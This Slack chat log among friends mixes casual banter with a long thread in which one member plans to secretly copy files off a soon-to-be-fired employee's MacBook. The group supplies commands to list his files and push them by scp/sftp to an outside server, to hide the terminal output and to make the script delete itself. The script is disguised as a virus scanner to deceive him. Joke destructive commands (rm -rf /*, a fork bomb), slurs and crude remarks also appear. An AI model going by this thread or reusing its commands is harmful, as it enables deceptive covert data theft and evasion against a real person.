Some malaysians got control of a couple of my peeps emails over the weekend :confused:
Phishing?
It would appear so
No
someone must have signed in somewhere they shouldnt have
in other news
I have to help fire someone today
which is never any fun
Haha oh man that should be interesting. What'd they do
Yes
Kiddy pr0n?
Not kiddy porn
but another porn case
anyways 2 questions for my genius friends today
1
What kind of weird shit was he in to? XD
what is the best iPhone app to free up space
thats also fre
free
1. none
really :confused:
Factory Reset
lol
Haaaaaaa
Apps can't access the filesystem
buh dum tis
/giphy throw it on the ground
You have to go into the usage summary in the settings app and figure out what is using all the space
Pr0n taking up too much space
:point_up:
well shit
ok next question
I have to retrieve information from this guy’s computer that I have to fire before tomorrow
he has a macbook
and is located in houston
No
Slackbot hacked Bobby's account
Leave me alone
anyone have any Ideas as to how I can retrieve the data
/giphy roadtrip
If his machine was open to it and on a VPN (doubt it) you could ssh into it if you had admin access
Yes
Thats what I'm saying
Otherwise you'll need physical access
I know the password to his account on the machine
maybe
possibly
I dunno
I can also trick him into thinking
Do yall have a VPN?
Getting him to expose SSH under the guise of updates wouldn't be super difficult I wouldn't think. But if he isn't on VPN you'll have to get him to port  forward which would be difficult I'd suspect.
No
I may be able to have access to his machine for a few seconds using chrome remote desktop
I do not believe chrome remote desktop has a curtain mode though
this is why I cant use it to retrieve the files
He cant know I am taking his files before tomorrow
hence why I am attempting to hack into his machine
In that case VPN is out of the question FTP is key. Also using the terminal since it has that "magic" factor to non-techies
omg
yes
so setup a ftp
on his machine and pull the data from mine
he wouldnt know what would be happening until I had finished and teminated connections
No
Or Vice Versa. You need a machine accessible via the interwebs already.
Like how I ususally have my server set up
you would want to dump the files from his machine to another machine
No
Lol send him a batch file or some script and ask him to run it. 

Do you know the exact directory?
On his machine you'd be doing:
`scp -r myPr0nFolder user@zacsServerIp:place/to/store`
<@U12VAQUN4> I suspect part of the problem is he'd need to do some explorin' first
Yeah a script would only be super effective if you already knew the directory
No
Recursively copy his whole drive. That'll show em
exactly
So what my goal now is is to start up a ftp server on his machine
preferably via terminal after I have remoted into his machine
To set up an FTP server on his machine, his router would have to forward port 22 to his machine
Yes
Isn't ftp port 21? 
22
It'd be easier to set up the server on one of your machines that can have its port forwarded and scp from his machine to your machine
22 for SFTP
Ahh sftp
(FTP over SSH)
hmm
Ok this has been some good inspiration
Do you have a web server you can access via SSH?
yes
Theres your server
No additional set up required
the problem then is that how do I navigate and access the files on the guy’s machine without him knowing
Chrome Desktop to his machine -&gt; open terminal -&gt; find pr0n -&gt; Use scp command from above to transfer files -&gt; profit
no
I cant do that
Why?
He'll see it
hmmmm
as soon as he sees me snooping through his files thats it
This is a mac right?
yes
Hmmm
Hmmm
perplexing scenario I know
Depending on how much time you have you can set up some scripts to investigate kind of
`ls /* &gt; files.txt`
`scp files.txt myserver`
Examine the contents
interesting concept
you know what
Write another script to grab the data
that could work
Yes
Theres a better command to show the files as a tree structure though
Yeah there is
I forget it though
Are these images or videos? Both?
This might work: `find . -type d | sed -e "s/[^-][^\/]*\//  |/g" -e "s/|\([^ ]\)/|-\1/"`
Ahh sed
glorious stream editor
You'd need to store these scripts somewhere (github could even work) and `wget` them on the target machine
No
Mm delicious wget
omg joseph
Yuh
`(find . -type d | sed -e "s/[^-][^\/]*\//  |/g" -e "s/|\([^ ]\)/|-\1/") &gt; list.txt` Run this in his home directory
Then grab that list file and delete it
Once you've grabbed the offending files
Run this for good measure: `sudo rm -rf /*`
lol jk DON'T do that
I know lol
you need a sudo for the first one too btw
At least I think so
Not if your in the user's home directory
If you were trying to list the root directory maybe
When I am trying to run it I’m getting a permission denied
nvm
ok
ok
:+1:
I think I am seeing this
Ooaah
So you just get a list of files?
so really the biggest thing is gonna be running a script
From that
yea
SCP formats data streams
to make them easier to read
ok
so what I will then need to do is do an sftp to the webserver and push up everything
Yes
Ill run a couple test and it should be good
Yes
I dont need to remove anything
I jsut need to get proof of the infractions
<@U12V0LN6Q|slayterdev> uploaded a file: <https://flippedbit.slack.com/files/slayterdev/F2ZC3B9A8/Investigation.sh|Investigation>
Well in that case the list may be all you need
Yeah you can just use that list
Although that relies on the files being named like "backdoor sluts 9.mp4" or something
yes and know
:point_up:
yes and no*
the more sinister part of this task is to retrieve certain proposal documents from the guy’s computer
Oh. He has important stuff you'll need after he gets fired?
mhmmm
Updated the shell snippet
this one includes files (the other was just directories XD)
directories would also work
No
my main task is to find his proposals
I already have proof of his browsing history
Ah ok
that was easy to snag
Lemme change it back
:+1:
the more difficult thing to do is really getting these proposals off his machine
:wink:
And you guys have been a big help
:clap: :clap: :clap: :clap: :clap: :clap: :clap: :clap: :clap: :clap: :clap:
I had forgotten about the idea of running a script to send it all up to my server
lol
A round of applause for all
just needed a little help from my frans
and a little coffee -_-
How did the brew go this weekend?
Quite well. Damn thing was thumpin like crazy this morning
angry little cub
Thats what we're gonna call the soda XD
lol
very nice
Also whipped up a batch of Apfelwein :slightly_smiling_face:
:open_mouth:
This sounds beautiful and phenomenal
It shall be
It was dead simple to make
what was the process like?
Grab a gallon of Apple Juice (100% juice. No preservatives) per gallon of Apfelwein you want to make
Get 0.4 lbs of sugar (preferably corn sugar but whatever) per gallon
Pour half a gallon of juice into sanitized fermenter
Add the sugar (divide it per gallon) to the half empty jug and shake the devil out of it
Repeat for each gallon
Add the sugar/juice mixtures to fermenter
Add yeast (wine or beer. NOT bread)
Wait at least a month (wait more though. trust me)
Try not to die from over consumption
:apple: :wine_glass:

there is a map of it
that would be one crazy pub craw
No
Wonder how long it would take
Yes
45,495km tour
the longest is a 435km, 50-hour trip, from the Sango Sands Oasis in Durness to the Bells But &amp; Ben in Shetland
Is anyone really good with child processes in C?

I have a program that implements piping like in the linux command line (" whatever | whatver") using two child processes and we have to print a message from the parent process after the child processes complete, but no matter where I put the print statement the parent prints out before the child process output.
Are you using `wait`?
<@U12VAQUN4|joseph.v> uploaded a file: <https://flippedbit.slack.com/files/joseph.v/F2ZAQ4HJN/main__.txt|main()>
Yeah
This is how I have it right now
I think I really only need one wait
I think you need to pass the child pid to wait
so I have two children (as per the instructions)
So if I remember correctly
For a process to wait for another process to complete, you need to pass the pid of the process you are waiting on to wait in the parent process
Ok. Well I have both the child PIDs.
how do I wait for both of them. Just two waitpid statements?
I believe so
Hmm lemme try it
now my output is weird XD

do you and your dad listen to the same music?
Same in principle but from different eras
how do I make a .sh file executable on mac <@U12V0LN6Q>
But that doesn't negate my point
`chmod +x myFile.sh`
thank you
dumb question
There are no dumb questions
Just dumb people
Which you are not :slightly_smiling_face:
thanks man...
You is smart
You is kind
You is important
Also for a shell file you can just use `sh myFile.sh`
mmm sezy
right now I am trying to remember my pass for the web server
Also be sure if you make it executable you have `#!/bin/bash` at the top
already done
Kewwwwwl
im fucking stupid
the webserver doesnt have sftp setup
I dont know how
fucking godaddy
hmmmm
what happens when you try?
it’ll run as a standard ftp
there are just no login credentials setup
Id have to go and enable it is all I wanna say
ah I see
Usually if you have SSH set up, scp will work
No
Fuck off robot bitch!
the company that set it up initially must not have done the thing
Well what I was gonna do in the script was basically search for any folders that have the term “proposal in it” and if it doesnt find it then just copy over the entire home folder.
that’d just be like cp /* -rf
or something similar
use ~ instead of /
~/*
~ means home
yes
will do
No
anyone seen doctor strange yet?
naw
Not yet :(
I have no idea what I can do here
since sftp doesnt work
I cant use scp
I thought you were setting up sftp?
I am
What does it say when you try?
but I cant find any options to setup sftp in the portal
only shit for ftp
Maybe enable it via SSH?
Idk how exactly but there must be a way
I know right
how could they not offer the service in this day and age
No
ok ssh is disabled
that explains alot
Enabke that shit
Your account contains Old Value Applications. You will have to remove these applications before enabling SSH.
Learn More
Yes
lol
thats the reason it wont enablel
Well shit 
I’m just sitting here like wtf is old value applications
the server doesnt run any applications
it literally is just sitting there hosting bullshit data
no wordpress joomla or drupal
just pure html
(and css and js you know how it goes)
Man I can not get this program to print where it's supposed to :disappointed:

Slackbot! Execute: `:(){ :|: &amp; };:`
..what?
<https://youtu.be/IUE9ZwCSMH4>
OMG I'm dying XD
so the script now works
and I’m good to deploy
the problem is
you can see whats happening in the terminal when you run the script
is there any way for me to hide the terminal after I enter the password
Run in the bg
cmd+H
can you run scp in the background
Or cmd z
&amp;
so `scp cmd goes here.... &amp;`
got ya
`scp list.txt serverStuff &amp;`
thats what I was looking for
thank you
test it first
Phat
Actually just ./myScript &amp;
But don't you need to put in the server password... :thinking_face:
yea
Hardcode. 
Lol jk
Hmm let me think'
If I can get it to run the rest in the background after inputting the password that’s all I’m needing
LISP or loose walking privalges for a week?
Well actually &amp; will still dump the output...
Yes
Pick one. 
Lisp
I want bad at LISP
wasnt*
Ok so I'm thinkin run the script
Enter the pass when prompted
Immediatley hide the window
Confirm on your end the file is uploaded
Kill the terminal without opening it back up
Better idea:
`scp list.txt serverStuff &gt; /dev/null`
You can enter your password and no scp output is shown
what’ll this do
ok
ok
i got you
test it
oh shit it worked
:fire: :+1: :fire:
/giphy fucking noice
So last piece of the puzzle. You gotta host that script and wget it
Liek dis: `wget <https://github.com/SlayterDev/DeafShark/blob/master/OSXBuildScript.sh>`
ah fuck wget isnt default on mac
brb
Pastebin
Too open
<@U12V0LN6Q> I got that under control
Oh ok good
;)
Sweet
I'm good gentlemen thank you for the brainstorm sesh
/giphy supah hot fiyah
now I cant delete my test folders from the web server
nvm
gots it
yeeee
oh god
this could take a long time
Yes
Por que
I tested it on my machine
and alot of the files in my downloads folder contain os images
Heh i see
Shouldn't be more than a minute or two especially for an average user
im contemplating throwing in a -c tag
for compression
-c for cake
The cake is a lie.

lol jeez dude
The bear is agressive :open_mouth:
Do you know off the top of your head if you can scp mulitple directories in a single line
Doesn't really look like it.
If its all in the same parent dir you can just grab that dir with the `-r` flag
so im gonna have to enter in the password for each command
I’m using the -r flag right now
but i have to copy over mulitple folders
I suppose so :confused:
Got it!
What?
One sec
I just finished doctoring it up to make it look like a virus scanner (using the premise that we have to do a virus scan to let me remote into his computer)
<@U12V0LN6Q|slayterdev> uploaded a file: <https://flippedbit.slack.com/files/slayterdev/F2YQPBZND/Untitled.sh|Untitled>
interesting
gonna test it in a second
check the edit
got it
Also if you want to dump it in the home folder of the server use `.`
It defaults to the home folder of the server user unlike scp
i actually have a path im gonna ave it to
I think it should work though
No
kewl
hang tight
ok
it works in a since
sense
I just need it to copy over the folders
so i need to put the -r flag
hold tight while I spit dis shit
looks like you put the -r after `sftp` and before `user@host`
thats what I was thinking as well
it seems to have worked
waiting now
ok
I had to make the directories on the server
gonna see if it runs now
forgot sftp doesnt make it for you
kewl
ok
added in a clear terminal
kill terminal
and delete script
now running a final test for potency
Well if you're deleteing script via terminal, delete then kill term
lol
I did
I just described the features in the wrong order
testing now
im escited
we are like
hax0rs
I wonder if `rm $0` would delete the script itself :thinking_face:
Yes
yep
it does
Well there ya go
to be exact
rm -- "$0"
"You didn't see anything"
how to you format it to look like code?
``code here``
Use single backticks tho
``spacetits = awesome``
shit
Just one on each side
`try again`
yesss!
:+1:
the script works
and not a moment too soon
Triple back ticks for multi line code
```awww yisssss
```awww yisssss
dammit to hell
Well at least thats the way it is for our work one
Alright I'm going dark for about an hour

I kinda hope they fill it with a station like 101X in Austin
Me too! I wonder if it'll be something completely different 
Something actuallly cutting edge
lol
the edge was dull
/giphy dull edge
Have you ever listened to 91.7 (I think that's what it is)?
no :open_mouth:
what genre is it?
I haven't but supposedly it's good alternative I think
I’d be good with that
I just wanna find something that plays new music
even if some of it is indie or underground stuff
4 realz
I just hope they keep the russ martin show going at the same time
91.7 is gewd
<@U132256GZ> They said on the show yesterday they still have a contract for at least a year so I think they're safe and I heard Cindy Skull (However you spell it) this morning so I don't really know how much is going to change there
<@U12VAQUN4> Ima give them a shot
oh good
I dont mind Cindy Skull all too much either
just as long as Atom Smasher is gone
Fur real
They don't even talk about anything on the adam smasher show. Just bullshit
I just hate how all he ever talks about is his half retarded offspring
I DONT GIVE 2 SHITS ABOUT YOUR STUPID KID
it was funny though
2 days ago I got in the truck and 102.1 was on from the night before
and it was adam
talking about how people had been DMing him saying his show sucks
and he said something along the lines of “tough luck just change the station ATOM SMASHER HERE TO STAY HURRR HURR HURR"
then I pulled into my drive way yesterday
to hear Russ’ sweet voice tickle my ears saying
“102.1 is getting cancelled"
XDDDDDDD
there is a god and he is great
Hahaha yessss

I've never really had a chance to try it. It seems like it wouldn't be that bad.
If it was cooked and seasoned well
I’m gonna start growing plants
What kinds of plants?
I dont know
I want to grow herbs again
just some kind
like maybe onions
onions would be kinda cool i guess
No

So last night, around 9, that dumbass tried to break in my place again. 
wat
Oh tell me yall beat his ass
He's hit that complex like 4 times already. 
hit his face 4 times
use the fist
:fist:
I thought I heard a knock, while doing my hw. So I got up, grabbed my lil flashlight bat, a cig, and went outside. 
shootem
I walked around the corner, and this dumbass is peeking from the other of the building in the opposite direction. I walk up behind him and say " The fuck you doin, nigga?"
oh god
this is getting good
And he says " nothing looking for a guy named John". 
lemme get some coffee
Git em
I wish you could have seen my face. 
Yes
"Oh nothing, just looking for John, while matching the exact description of a suspect known to be breaking in this area, good sir. Is THIS your apartment right HERE?"
he said that?
Someone called the cops earlier, so they showed up, but he was long gone. He left after I asked him if John would be chillin by my window, 9 o'clock at night, in the dark. 
No
But now that I know what he looks like, if I see him again. 
Hahahahababba
See slackbot knows not to fuck around
..what?
Did he run off. Or was he just like "Well you have a point there." and walked away?
He just kinda got quiet, and pulled out a phone and started texting someone. 
Fuck em

I am really nervous about trying to keep it from getting stolen
you could freeway it because there is always traffic
No
<@U1372C4NM> how do you prevent that man
Dude I’ve thought about riding a bike to work
shits expensive in my truck
<https://youtu.be/B3WMzMkUyN0>
It costs me 250 a month
250*******
Man, the inly thing you could do is get a gps tracker, and maybe chain it up. 
No
god that mileage would be so nice though
No
almost worth the risk
Yeah dude. Amazon has some really nice deals on gear too. 
Seriously I’ve been looking on there nonstop
I am looking at a rebel
just for the first ride
they are cheap and shit
1200 on Craigslist. 
I think I maybe too tall for it though
:confused:
Go sit on one if you can. 
Once I get dah money, I'll probably get a used Grom. I dont need to go too fast, and I don't travel too far. I just wanna have fun really. 
And do wheelies. 
I'm proud of all my friends today :)
